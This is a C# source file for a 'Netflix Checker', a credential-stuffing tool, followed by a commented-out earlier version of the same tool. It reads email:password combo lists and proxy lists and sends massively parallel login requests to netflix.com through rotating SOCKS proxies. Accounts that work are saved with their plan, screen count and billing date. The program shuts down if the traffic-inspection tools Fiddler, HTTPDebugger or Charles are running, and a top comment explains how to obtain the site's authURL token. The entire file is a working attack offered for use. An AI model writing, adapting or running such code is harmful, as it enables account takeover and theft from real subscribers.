














//to find authURL use this in console of netflix.com on chrome:	netflix.reactContext.models.userInfo.data.authURL














using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using xNet;

namespace Netflix
{
    internal class Program
    {
        public Program()
        {
        }

        [STAThread]
        private static void Main(string[] m)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Netflix Checker | By Ashay v0.2");
            Console.ForegroundColor = ConsoleColor.Yellow;
            if ((int)Process.GetProcessesByName("Fiddler").Length != 0)
            {
                Environment.Exit(0);
            }
            if ((int)Process.GetProcessesByName("HTTPDebugger").Length != 0)
            {
                Environment.Exit(0);
            }
            if ((int)Process.GetProcessesByName("Charles").Length != 0)
            {
                Environment.Exit(0);
            }
			string temp=(string.Concat(@"G:\1\p",(new Random()).Next(0,255),".txt"));
			//string temp=(string.Concat(@"G:\2\test.txt"));
            string fileName = @temp;
            string fileName1 = @"G:\vipsocks.txt";
			string badP = "";
            List<string> list = File.ReadAllLines(fileName).ToList<string>();
            List<string> strs = File.ReadAllLines(fileName1).ToList<string>();
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(string.Concat("Combos Loaded: ", list.Count));
            Console.WriteLine(string.Concat("Proxies Loaded: ", strs.Count));
            Console.ResetColor();
            int num = 1000;
            if ((int)Process.GetProcessesByName("Fiddler").Length != 0)
            {
                Environment.Exit(0);
            }
            if ((int)Process.GetProcessesByName("HTTPDebugger").Length != 0)
            {
                Environment.Exit(0);
            }
            if ((int)Process.GetProcessesByName("Charles").Length != 0)
            {
                Environment.Exit(0);
            }
            Console.ResetColor();
            if ((int)Process.GetProcessesByName("Fiddler").Length != 0)
            {
                Environment.Exit(0);
            }
            if ((int)Process.GetProcessesByName("HTTPDebugger").Length != 0)
            {
                Environment.Exit(0);
            }
            if ((int)Process.GetProcessesByName("Charles").Length != 0)
            {
                Environment.Exit(0);
            }
            string str5 = "2";
            string str6 = str5;
            if (str6 == "1")
            {
                str5 = "HTTP";
            }
            else if (str6 == "2")
            {
                str5 = "SOCK5";
            }
            else if (str6 == "3")
            {
                str5 = "SOCK4";
            }
            string str7 = str5.ToString();
            int totC = 0;
            int hitsC = 0;
            int errorC = 0;
            int badC = 0;
            Task.Factory.StartNew(() => {
                while (true)
                {
                    Console.Title = string.Concat(new object[] { "[Netflix Checker] ", totC, " Checked of ", list.Count, " accounts - ", "Proxies - ",strs.Count,"       ", hitsC," HITS | ", badC, " BAD | ", errorC, " ERRORS" });
					Thread.Sleep(1000);
                }
            });
            Parallel.ForEach<string>(list, new ParallelOptions()
            {
                MaxDegreeOfParallelism = num
            }, (string account) => {
                string str;
                if ((int)account.Split(new char[] { ':' }).Length == 2)
                {
                    string str1 = account.Split(new char[] { ':' })[0];
                    string str2 = account.Split(new char[] { ':' })[1];
                    while (true)
                    {
                        while (true)
                        {
                            try
                            {
                                using (HttpRequest httpRequest = new HttpRequest())
                                {
                                    badP=strs[(new Random()).Next(strs.Count)];
									httpRequest.Proxy = badP;
                                    httpRequest.Type = str7;
                                    httpRequest.Cookies = new CookieDictionary(false);
                                    httpRequest.ConnectTimeout = 1000;
                                    httpRequest.AddHeader("Accept", "*/*");
                                    httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                                    httpRequest.AddHeader("User-Agent", "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.0 Version/10.00");
                                    HttpResponse httpResponse = httpRequest.Start(HttpMethod.POST, new Uri("https://www.netflix.com/mx/Login?nextpage"), new BytesContent(Encoding.UTF8.GetBytes(string.Concat(new string[] { "email=", str1, "&password=", str2, "&flow=websiteSignUp&mode=login&action=loginAction&withFields=rememberMe%2CnextPage%2Cemail%2Cpassword&authURL=1549197886985.YQM2WaLT35VZeC2Dkw54I/Qn8fo=&nextPage=https%3A%2F%2Fwww.netflix.com%2FYourAccount%3Flnkctr%3DmhSS&showPassword="}))));
                                    if (httpResponse != null)
                                    {
                                        str = httpResponse.ToString();
                                    }
                                    else
                                    {
                                        str = null;
                                    }
                                    string str3 = str;
                                    if (str3 == null)
                                    {
                                        Interlocked.Increment(ref errorC);
                                        continue;
                                    }
                                    else if ((str3.Contains("\"CURRENT_MEMBER\",\"isInFreeTrial\":false") ? true : str3.Contains("\"CURRENT_MEMBER\",\"isInFreeTrial\":true")))
                                    {
                                        string value = Regex.Match(str3, "\"nextBillingDate\":\"(.*?)\"").Groups[1].Value;
                                        string value1 = Regex.Match(str3, "currentPlanName\":\"(.*?)\"").Groups[1].Value;
                                        string value2 = Regex.Match(str3, "maxStreams\":(.*?),\"").Groups[1].Value;
                                        string str4 = value.Replace("/", "\\");
                                        Interlocked.Increment(ref hitsC);
                                        Console.ForegroundColor = ConsoleColor.Yellow;
                                        Console.WriteLine(string.Concat(new string[] { "[HIT] - ", account, " Plan:", value1, " Screens:", value2, " Expire:", str4 }));
                                        Console.ResetColor();
                                        try
                                        {
                                            using (StreamWriter streamWriter = new StreamWriter(@"C:\Users\Ashay\Desktop\hits.txt", true))
                                            {
                                                streamWriter.WriteLine("-------------------<NETFLIX>------------------------");
                                                streamWriter.WriteLine(string.Concat(new string[] { "- Login: ", account, " Plan: ", value1, " Screens: ", value2, " Expire: ", str4 }));
                                                streamWriter.WriteLine("--------------------------------------------------------");
                                                streamWriter.WriteLine(Environment.NewLine);
                                            }
                                        }
                                        catch
                                        {
                                            Thread.Sleep((new Random()).Next(25, 75));
                                        }
                                        goto Label0;
                                    }
                                    else if (str3.Contains("email_incorrect_password"))
                                    {
                                        Interlocked.Increment(ref badC);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("incorrect_password"))
                                    {
                                        Interlocked.Increment(ref badC);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("login_error_input_password"))
                                    {
                                        Interlocked.Increment(ref badC);
                                        Console.ForegroundColor = ConsoleColor.Gray;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("unrecognized_email"))
                                    {
                                        Interlocked.Increment(ref badC);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("login_error_fallback"))
                                    {
                                        Interlocked.Increment(ref badC);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("NEVER_MEMBER"))
                                    {
                                        Interlocked.Increment(ref badC);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("RESTART YOUR MEMBERSHIP"))
                                    {
                                        Interlocked.Increment(ref badC);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[RESTART] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("FORMER_MEMBER"))
                                    {
                                        Interlocked.Increment(ref badC);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[FORMER] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("ANONYMOUS"))
                                    {
                                        Interlocked.Increment(ref badC);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("\"DVD_ONLY_MEMBER\",\"isInFreeTrial\":false"))
                                    {
                                        Interlocked.Increment(ref badC);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("NON_REGISTERED_MEMBER"))
                                    {
                                        Interlocked.Increment(ref badC);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                }
                                break;
                            }
                            catch (HttpException httpException1)
                            {
                                HttpException httpException = httpException1;
                                break;
                            }
                        }
                    }
                Label0:
                    Interlocked.Increment(ref totC);
                }
            });
            Console.WriteLine("Done");
            Thread.Sleep(-1);
        }
    }
}

/*
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using xNet;

namespace Netflix
{
    internal class Program
    {
        public Program()
        {
        }

        [STAThread]
        private static void Main(string[] test)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Netflix Checker | By Burnwood");
            Console.ForegroundColor = ConsoleColor.Yellow;
            if ((int)Process.GetProcessesByName("Fiddler").Length != 0)
            {
                Environment.Exit(0);
            }
            if ((int)Process.GetProcessesByName("HTTPDebugger").Length != 0)
            {
                Environment.Exit(0);
            }
            if ((int)Process.GetProcessesByName("Charles").Length != 0)
            {
                Environment.Exit(0);
            }
            OpenFileDialog openFileDialog = new OpenFileDialog()
            {
                Title = "Load Combo List",
                DefaultExt = "txt",
                Filter = "Text files|*.txt",
                RestoreDirectory = true
            };
            openFileDialog.ShowDialog();
            string fileName = openFileDialog.FileName;
            OpenFileDialog openFileDialog1 = new OpenFileDialog();
            openFileDialog.Title = "Load Proxy List";
            openFileDialog.DefaultExt = "txt";
            openFileDialog.Filter = "Text files|*.txt";
            openFileDialog.RestoreDirectory = true;
            openFileDialog.ShowDialog();
            string fileName1 = openFileDialog.FileName;
            List<string> list = File.ReadAllLines(fileName).ToList<string>();
            List<string> strs = File.ReadAllLines(fileName1).ToList<string>();
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(string.Concat("Combos Loaded: ", list.Count));
            Console.WriteLine(string.Concat("Proxies Loaded: ", strs.Count));
            Console.ResetColor();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("Threads : ");
            int num = int.Parse(Console.ReadLine());
            if ((int)Process.GetProcessesByName("Fiddler").Length != 0)
            {
                Environment.Exit(0);
            }
            if ((int)Process.GetProcessesByName("HTTPDebugger").Length != 0)
            {
                Environment.Exit(0);
            }
            if ((int)Process.GetProcessesByName("Charles").Length != 0)
            {
                Environment.Exit(0);
            }
            Console.WriteLine("Proxies : ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("(1) HTTP");
            Console.WriteLine("(2) SOCK5");
            Console.WriteLine("(3) SOCK4");
            Console.Write("Proxies Type : ");
            Console.ResetColor();
            if ((int)Process.GetProcessesByName("Fiddler").Length != 0)
            {
                Environment.Exit(0);
            }
            if ((int)Process.GetProcessesByName("HTTPDebugger").Length != 0)
            {
                Environment.Exit(0);
            }
            if ((int)Process.GetProcessesByName("Charles").Length != 0)
            {
                Environment.Exit(0);
            }
            string str5 = Console.ReadLine();
            string str6 = str5;
            if (str6 == "1")
            {
                str5 = "HTTP";
            }
            else if (str6 == "2")
            {
                str5 = "SOCK5";
            }
            else if (str6 == "3")
            {
                str5 = "SOCK4";
            }
            string str7 = str5.ToString();
            int num1 = 0;
            int num2 = 0;
            int num3 = 0;
            int num4 = 0;
            Task.Factory.StartNew(() => {
                while (true)
                {
                    Console.Title = string.Concat(new object[] { "[Netflix Checker By Burnwood V2.0] ", num1, " Checked of ", list.Count, " accounts - ", num2, " Hits | ", num4, " BAD | ", num3, " ERRORS" });
                    Thread.Sleep(1000);
                }
            });
            Parallel.ForEach<string>(list, new ParallelOptions()
            {
                MaxDegreeOfParallelism = num
            }, (string account) => {
                string str;
                if ((int)account.Split(new char[] { ':' }).Length == 2)
                {
                    string str1 = account.Split(new char[] { ':' })[0];
                    string str2 = account.Split(new char[] { ':' })[1];
                    while (true)
                    {
                        while (true)
                        {
                            try
                            {
                                using (HttpRequest httpRequest = new HttpRequest())
                                {
                                    httpRequest.Proxy = strs[(new Random()).Next(strs.Count)];
                                    httpRequest.Type = str7;
                                    httpRequest.Cookies = new CookieDictionary(false);
                                    httpRequest.ConnectTimeout = 5000;*/
                                    //httpRequest.AddHeader("Accept", "*/*");
                                    /*httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                                    httpRequest.AddHeader("User-Agent", "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.0 Version/10.00");
                                    HttpResponse httpResponse = httpRequest.Start(HttpMethod.POST, new Uri("https://www.netflix.com/mx/Login?nextpage"), new BytesContent(Encoding.UTF8.GetBytes(string.Concat(new string[] { "email=", str1, "&password=", str2, "&flow=websiteSignUp&mode=login&action=loginAction&withFields=rememberMe%2CnextPage%2Cemail%2Cpassword&authURL=1537218071801.f190UMMM7Lof1aY2ml6aO2%2BQGpQ%3D&nextPage=https%3A%2F%2Fwww.netflix.com%2FYourAccount%3Flnkctr%3DmhSS&showPassword=" }))));
                                    if (httpResponse != null)
                                    {
                                        str = httpResponse.ToString();
                                    }
                                    else
                                    {
                                        str = null;
                                    }
                                    string str3 = str;
                                    if (str3 == null)
                                    {
                                        Interlocked.Increment(ref num3);
                                        continue;
                                    }
                                    else if ((str3.Contains("\"CURRENT_MEMBER\",\"isInFreeTrial\":false") ? true : str3.Contains("\"CURRENT_MEMBER\",\"isInFreeTrial\":true")))
                                    {
                                        string value = Regex.Match(str3, "\"nextBillingDate\":\"(.*?)\"").Groups[1].Value;
                                        string value1 = Regex.Match(str3, "currentPlanName\":\"(.*?)\"").Groups[1].Value;
                                        string value2 = Regex.Match(str3, "maxStreams\":(.*?),\"").Groups[1].Value;
                                        string str4 = value.Replace("/", "\\");
                                        Interlocked.Increment(ref num2);
                                        Console.ForegroundColor = ConsoleColor.Yellow;
                                        Console.WriteLine(string.Concat(new string[] { "[HIT] - ", account, " Plan:", value1, " Screens:", value2, " Expire:", str4 }));
                                        Console.ResetColor();
                                        try
                                        {
                                            using (StreamWriter streamWriter = new StreamWriter("hits.txt", true))
                                            {
                                                streamWriter.WriteLine("-------------------<NETFLIX>------------------------");
                                                streamWriter.WriteLine(string.Concat(new string[] { "- Login: ", account, " Plan: ", value1, " Screens: ", value2, " Expire: ", str4 }));
                                                streamWriter.WriteLine("--------------------------------------------------------");
                                                streamWriter.WriteLine(Environment.NewLine);
                                            }
                                        }
                                        catch
                                        {
                                            Thread.Sleep((new Random()).Next(25, 75));
                                        }
                                        goto Label0;
                                    }
                                    else if (str3.Contains("email_incorrect_password"))
                                    {
                                        Interlocked.Increment(ref num4);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("incorrect_password"))
                                    {
                                        Interlocked.Increment(ref num4);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("login_error_input_password"))
                                    {
                                        Interlocked.Increment(ref num4);
                                        Console.ForegroundColor = ConsoleColor.Gray;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("unrecognized_email"))
                                    {
                                        Interlocked.Increment(ref num4);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("login_error_fallback"))
                                    {
                                        Interlocked.Increment(ref num4);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("NEVER_MEMBER"))
                                    {
                                        Interlocked.Increment(ref num4);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("RESTART YOUR MEMBERSHIP"))
                                    {
                                        Interlocked.Increment(ref num4);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("FORMER_MEMBER"))
                                    {
                                        Interlocked.Increment(ref num4);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("ANONYMOUS"))
                                    {
                                        Interlocked.Increment(ref num4);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("\"DVD_ONLY_MEMBER\",\"isInFreeTrial\":false"))
                                    {
                                        Interlocked.Increment(ref num4);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                    else if (str3.Contains("NON_REGISTERED_MEMBER"))
                                    {
                                        Interlocked.Increment(ref num4);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine(string.Concat("[BAD] - ", account));
                                        Console.ResetColor();
                                        goto Label0;
                                    }
                                }
                                break;
                            }
                            catch (HttpException httpException1)
                            {
                                HttpException httpException = httpException1;
                                Console.ForegroundColor = ConsoleColor.Gray;
                                Console.WriteLine("Error: {0}", httpException.Message);
                                Console.ResetColor();
                                switch (httpException.Status)
                                {
                                    case HttpExceptionStatus.Other:
                                    {
                                        Console.WriteLine("Unknown error");
                                        break;
                                    }
                                    case HttpExceptionStatus.ProtocolError:
                                    {
                                        Console.WriteLine("Status code: { 0}", (int)httpException.HttpStatusCode);
                                        break;
                                    }
                                    case HttpExceptionStatus.ConnectFailure:
                                    {
                                        Console.WriteLine("Could not connect to http-server.");
                                        break;
                                    }
                                    case HttpExceptionStatus.SendFailure:
                                    {
                                        Console.WriteLine("Failed to send request to HTTP server.");
                                        break;
                                    }
                                    case HttpExceptionStatus.ReceiveFailure:
                                    {
                                        Console.WriteLine("Could not load response from HTTP server.");
                                        break;
                                    }
                                }
                                break;
                            }
                        }
                    }
                Label0:
                    Interlocked.Increment(ref num1);
                }
            });
            Console.WriteLine("Done");
            Thread.Sleep(-1);
        }
    }
}*/